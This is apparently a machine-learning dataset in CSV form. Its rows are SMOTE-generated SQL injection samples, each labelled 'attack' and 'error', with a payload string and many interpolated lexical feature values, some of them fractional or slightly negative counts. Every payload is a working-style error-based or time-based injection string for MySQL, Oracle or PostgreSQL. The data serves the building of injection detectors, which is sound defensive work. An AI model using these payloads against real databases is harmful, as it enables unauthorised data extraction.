id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000161,attack,error,"1'   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  'yiem'  =  'yiem",nearest_attack_euclidean,R000125,0.6550697218034943,307.27288226364414,36.0,3.7979901584580356,107.27288226364412,35.0,125.0,40.0,0.34911138851822016,0.11390550700931147,0.4068053821761124,0.13017772229635596,4.0,0.0,0.0,0.0,2.0,2.0,0.0,24.0,0.0,2.0,5.0,4.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.2728822636441208,0.7271177363558792,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000162,attack,error,"1'   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'pqxe' like 'pqxe",nearest_attack_euclidean,R000133,0.3026829096023512,295.4022779702144,37.82681853134763,3.9223342178164797,110.3072741253905,35.0,113.26818531347627,36.82681853134763,0.3734545359484025,0.1185277618877617,0.38332887396354104,0.12468882820029478,4.0,0.0,0.0,0.0,2.0,1.1731814686523734,0.0,21.653637062695253,0.0,2.0,5.0,3.1731814686523734,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000163,attack,error,"-8614'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000094,0.07407355633098567,206.0462636290054,39.09252725801083,3.869513634341203,63.0,37.0,83.0,23.046263629005416,0.3057568920635209,0.17957150803730593,0.40282257208368627,0.11184902781548688,1.0,0.0,1.0,0.0,1.0,1.0,0.0,15.0,0.04626362900541511,0.0,3.0,3.0,1.0,-2.7755575615628914e-17,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000164,attack,error,"1""  )   as hoiv where 9708  =  9708 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000110,0.4315768325902844,207.01161429558846,32.662795234803845,3.6480421266966947,54.83139761740192,40.0,86.01161429558847,26.168602382598078,0.2649209819318426,0.19324820086500416,0.4154241923833624,0.1264066248197908,0.0,1.0,2.0,0.0,1.0,2.0,0.0,15.16860238259808,0.0,0.0,4.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,1.0,0.8313976174019213,0.16860238259807858,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000165,attack,error,"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'fbsi' like 'fbsi",nearest_attack_euclidean,R000020,0.5616166317305586,226.23387210570604,31.0,3.4197518371508075,58.23387210570603,32.0,105.0,31.0,0.25740303523758556,0.14144704090712656,0.46412310297650905,0.13702682087877885,4.0,0.0,0.0,0.0,1.0,1.0,0.0,20.0,0.0,0.0,4.0,2.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.2338721057060298,0.7661278942939702,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000166,attack,error,"1'  )   where 7391  =  7391 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000208,0.4490933981096554,283.81563565076766,39.490781782538384,4.025957639970193,103.94469069523029,43.0,102.8893813904606,33.98156356507677,0.3663223850459999,0.15169481686053168,0.36222719403721315,0.1197556040562553,1.0,0.0,2.0,0.0,2.0,2.0,0.0,18.98156356507677,0.0,2.0,5.0,6.0,1.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,2.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000167,attack,error,"1"" and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   ",nearest_attack_euclidean,R000103,0.4769924941541171,323.3902571415001,31.804871429249946,3.5611103191485527,89.0,45.0,134.39025714150011,55.0,0.2752109275008954,0.13915159255663248,0.4155633112621436,0.1700741686803286,0.0,0.8048714292499471,0.0,0.0,0.0,2.0,0.0,28.195128570750054,0.0,3.0,0.0,22.0,0.0,0.8048714292499471,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000168,attack,error,"1'+  (  select vvet where 5221  =  5221 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  +'",nearest_attack_euclidean,R000302,0.22468201495214368,213.37757623926564,33.647299182449046,3.695874388634408,58.717839345959234,39.43567869191848,87.3651385284083,27.85891967297962,0.2752678890810214,0.18467945419553894,0.4094544107207463,0.13059824600269332,2.14108032702038,0.0,0.0,0.0,1.0,2.0,0.0,15.85891967297962,0.0,0.0,4.0,4.85891967297962,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.92945983648981,0.0,0.9294598364898099,1.0,1.07054016351019,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.92945983648981
SMOTE_000169,attack,error,"-7686%""  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000024,0.08437310605022369,206.68159654707694,40.0,3.8910164422251055,63.0,37.0,82.78773103138462,23.893865515692315,0.3048299424984775,0.1790271090864074,0.40054528829498,0.11559766012013513,0.0,1.0,1.0,0.0,1.0,1.0,0.0,14.946932757846156,0.946932757846157,0.0,3.0,3.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000170,attack,error,-9143  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,nearest_attack_euclidean,R000093,1.4451208858807505,341.2357695081849,30.751581165757237,3.259548822460628,74.99367533697105,47.254743497271704,159.7452565027283,59.24209417121382,0.21974204892370652,0.13854169726021626,0.4681547706457761,0.17356148317030112,0.9936753369710594,0.0,0.7515811657572352,0.0,0.0,2.2484188342427647,0.0,32.75158116575724,0.4968376684855297,0.0,0.0,23.0,0.24841883424276479,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.1102230246251565e-16,0.49683766848552935,0.7515811657572353,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.248418834242765
SMOTE_000171,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'lwlh'  =  'lwlh",nearest_attack_euclidean,R000237,0.4407675180339963,289.05560991496776,36.74768292020968,3.9236334636906607,107.0,35.0,110.04634159580648,37.00926831916129,0.3706339676004932,0.12123540996277815,0.3801438246629484,0.1279867977737803,4.0,0.0,0.0,0.0,2.0,2.0,0.0,21.009268319161293,0.0,2.0,5.0,4.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000172,attack,error,"1'   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'fgox' like 'fgox",nearest_attack_euclidean,R000181,0.52479223687915,298.7858778649888,36.42824427002245,3.9004364606100146,111.78587786498878,35.0,115.0,37.0,0.3741325577512615,0.11714096512676925,0.3848917425593847,0.12383473456258462,4.0,0.0,0.0,0.0,2.0,1.0,0.0,22.0,0.0,2.0,5.0,3.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.7858778649887763,0.21412213501122374,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000173,attack,error,"-4095'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000215,0.05540050722382752,206.0,39.792141011670246,3.876876879618298,63.0,37.0,83.0,23.0,0.3058252427184466,0.1796116504854369,0.4029126213592233,0.11165048543689321,1.0,0.0,1.0,0.0,1.0,1.0,0.0,15.0,0.0,0.0,3.0,3.0,1.0,-2.7755575615628914e-17,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000174,attack,error,"1""  )   as mwja where 7881  =  7881 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",nearest_attack_euclidean,R000270,0.00807332380480208,327.01960991306123,40.99673168115647,4.052232181934038,109.99673168115648,63.0,119.0196099130612,35.00326831884353,0.33636181290741596,0.1926492049432657,0.3639518312984244,0.10703715085089395,0.0,1.0,2.0,0.0,2.0,2.0,0.0,21.003268318843535,0.0,0.0,6.0,7.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,1.0,1.0,0.996731681156467,0.003268318843532847,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000175,attack,error,"1""  )   as zbhs where 2017  =  2017 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R000173,0.1707435871365124,321.61626988802124,40.0,4.026593704519395,106.9767399483175,63.0,116.9767399483175,34.66278999138625,0.3325745683505869,0.19595812341534194,0.3636790323847682,0.10778827584930295,0.0,1.0,2.0,0.0,2.0,2.0,0.0,20.66278999138625,0.0,0.0,6.0,7.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,1.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000176,attack,error,"1'   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   'wbsz'  =  'wbsz",nearest_attack_euclidean,R000253,0.2959522164584361,331.8141348947331,37.59107771271945,3.9126538597191,109.0,55.0,129.17844574561093,38.635689149122186,0.328907651747335,0.16596257656975621,0.3887547948858652,0.11637497679704356,4.0,0.0,0.0,0.0,2.0,2.0,0.0,23.635689149122186,0.0,0.0,6.0,5.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000177,attack,error,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",nearest_attack_euclidean,R000161,0.20270555789595313,234.26540629533352,33.13270314766676,3.926207400500402,81.0,45.0,83.0,25.26540629533352,0.345767831826438,0.19209323990357668,0.35430530915548586,0.10783361911449948,2.1327031476667595,0.0,0.0,0.0,0.0,2.0,0.0,14.0,0.0,0.0,5.0,4.13270314766676,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.06635157383337988,2.0,0.0,1.0,1.1102230246251565e-16,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000178,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'gfll'  =  'gfll",nearest_attack_euclidean,R000249,0.1142476868230341,241.5766424916956,32.0,3.7104953761639097,77.0,37.0,98.86131399335648,28.71532849833912,0.3188081479386679,0.1531935256328664,0.4091494913583084,0.11884883507015725,4.0,0.0,0.0,0.0,0.0,2.0,0.0,17.71532849833912,0.0,0.0,5.0,2.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000179,attack,error,"1"" where 9172  =  9172 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R000240,0.5700765254848845,312.7700515611016,39.54010312220318,4.025842501229098,103.0,63.0,113.0,33.77005156110159,0.32931601426647145,0.2014262999882301,0.3612884428360318,0.10796924290926664,0.0,0.7700515611015882,2.0,0.0,2.0,2.0,0.0,20.0,0.0,0.0,6.0,7.0,0.0,0.7700515611015882,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,1.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000180,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000293,0.03621839661609877,252.92892620091627,35.0,3.955613736983276,96.95735572054977,35.0,90.97157048036651,30.0,0.38333713432057587,0.13837956749598257,0.3596722403297422,0.11861105785369934,0.985785240183255,0.0,0.0,0.0,2.0,1.0,0.0,18.0,0.0,2.0,5.0142147598167455,3.0,0.985785240183255,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,0.985785240183255,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.985785240183255
SMOTE_000181,attack,error,"1'+  (  select 'ples' where 4244  =  4244 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",nearest_attack_euclidean,R000126,0.08720093288008282,235.44893944683517,31.967584673343246,3.9377414112253453,80.87033869337299,44.74067738674596,82.90275402002973,26.93516934668649,0.343491909226112,0.18997363958216207,0.35213582490983086,0.11439862628189501,4.0,0.0,0.0,0.0,0.0,2.0,0.0,14.0,0.0,0.0,5.0,3.93516934668649,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.9675846733432452,0.0,0.9675846733432452,1.1102230246251565e-16,0.03241532665675484,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.967584673343245
SMOTE_000182,attack,error,"1""   )    )    as vtad where 3653  =  3653 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000134,1.4399072130561683,186.55716626564111,36.0,3.899035749890204,61.934299759384686,31.31143325312823,71.68856674687177,21.622866506256457,0.3319447599795749,0.167833371197549,0.3843604232445268,0.11586144557834938,0.6228665062564553,0.6885667468717722,0.0,0.0,0.0,1.0,0.0,14.0,0.0,0.0,4.0,1.6228665062564556,0.3114332531282277,0.6885667468717722,0.0,0.6885667468717721,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.3114332531282278,0.0,1.0,1.1102230246251565e-16,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.311433253128228
SMOTE_000183,attack,error,"1 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  ",nearest_attack_euclidean,R000132,0.15126513464953753,290.58497264381305,37.0,3.9560316231515467,98.68872948285978,55.0,106.79248632190652,30.10375683904674,0.33961358750643234,0.1892767520934694,0.36750627353457144,0.10360338686552689,0.0,0.0,0.0,0.0,2.0,1.0,0.0,20.0,0.0,0.0,6.1037568390467385,4.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,0.8962431609532621,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,12.896243160953262
SMOTE_000184,attack,error,"1'   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'mymg'  =  'mymg",nearest_attack_euclidean,R000119,0.21231959354601254,300.5067008904116,35.50134017808232,3.855500865037502,108.0,35.0,119.00536071232928,38.50134017808232,0.35946653342451346,0.11649378398016641,0.3959329892802228,0.1281066933150973,4.0,0.0,0.0,0.0,2.0,2.0,0.0,22.50134017808232,0.0,2.0,5.0,4.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000185,attack,error,-7648'  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,nearest_attack_euclidean,R000034,1.211609771557544,336.61169799976824,30.729386749913083,3.2654064269959777,74.42353775002897,46.72938674991308,157.30584899988412,58.15292449994206,0.2211440218198707,0.1387901310327921,0.4673168734762354,0.1727489736711018,1.0,0.0,0.5764622499710272,0.0,0.0,2.0,0.0,32.57646224997103,0.0,0.0,0.0,22.576462249971023,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.1102230246251565e-16,0.42353775002897276,0.5764622499710271,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
